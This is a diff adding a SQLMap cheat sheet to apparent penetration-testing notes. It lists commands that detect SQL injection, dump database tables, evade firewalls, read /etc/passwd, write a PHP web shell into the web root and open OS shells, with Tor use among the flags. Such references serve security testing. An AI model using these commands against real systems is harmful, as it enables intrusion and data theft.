@@ -268,3 +268,147 @@ exploit
 ---
 
 
+
+# 🐍 SQLMap 
+
+SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.
+
+## 📦 Basic Command Structure
+
+```bash
+sqlmap -u <URL> [OPTIONS]
+```
+
+
+## 🔎 Detection and Enumeration
+
+### Basic Scan
+```bash
+sqlmap -u "http://example.com/page.php?id=1"
+```
+
+### Specify Request Method
+```bash
+sqlmap -u "http://example.com/page.php" --data="id=1"
+```
+
+### Crawl a Website (Spider)
+```bash
+sqlmap -u "http://example.com" --crawl=3
+```
+
+## 🧠 Enumeration Options
+
+### Enumerate DBMS
+```bash
+sqlmap -u <URL> --dbms=mysql
+```
+
+### List Databases
+```bash
+sqlmap -u <URL> --dbs
+```
+
+### List Tables
+```bash
+sqlmap -u <URL> -D <database> --tables
+```
+
+### List Columns
+```bash
+sqlmap -u <URL> -D <database> -T <table> --columns
+```
+
+### Dump Table Data
+```bash
+sqlmap -u <URL> -D <database> -T <table> --dump
+```
+
+## 🧰 Authentication
+
+### Cookie Injection
+```bash
+sqlmap -u <URL> --cookie="SESSIONID=abc123"
+```
+
+### Auth with Headers
+```bash
+sqlmap -u <URL> --headers="X-API-Key: xyz"
+```
+
+## 🎯 Targeted Testing
+
+### Specific Parameter
+```bash
+sqlmap -u <URL> -p id
+```
+
+### Risk and Level
+```bash
+sqlmap -u <URL> --risk=3 --level=5
+```
+
+- `--risk`: affects the risk of tests (1-3)
+- `--level`: affects number of tests (1-5)
+
+
+## 🪓 Bypasses and Tampering
+
+### Use Tamper Script
+```bash
+sqlmap -u <URL> --tamper=charencode
+```
+
+### Random User-Agent
+```bash
+sqlmap -u <URL> --random-agent
+```
+
+## 🧱 WAF Evasion
+
+```bash
+sqlmap -u <URL> --tamper=between,charencode
+```
+
+Use `--identify-waf` to detect WAF
+
+## 💾 File Operations
+
+### Read a File
+```bash
+sqlmap -u <URL> --file-read="/etc/passwd"
+```
+
+### Write a File
+```bash
+sqlmap -u <URL> --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+```
+
+## 💉 Shell Access
+
+### Get OS Shell
+```bash
+sqlmap -u <URL> --os-shell
+```
+
+### Get SQL Shell
+```bash
+sqlmap -u <URL> --sql-shell
+```
+
+## 📜 Useful Flags
+
+| Flag             | Description                     |
+|------------------|---------------------------------|
+| `--batch`        | Non-interactive mode            |
+| `--threads=N`    | Use multiple threads            |
+| `--tor`          | Use Tor for anonymity           |
+| `--proxy`        | Use a proxy (e.g. http://...)   |
+| `--timeout=N`    | Set request timeout             |
+| `--retries=N`    | Retry failed requests N times   |
+
+---
+---
+---
+---
+---
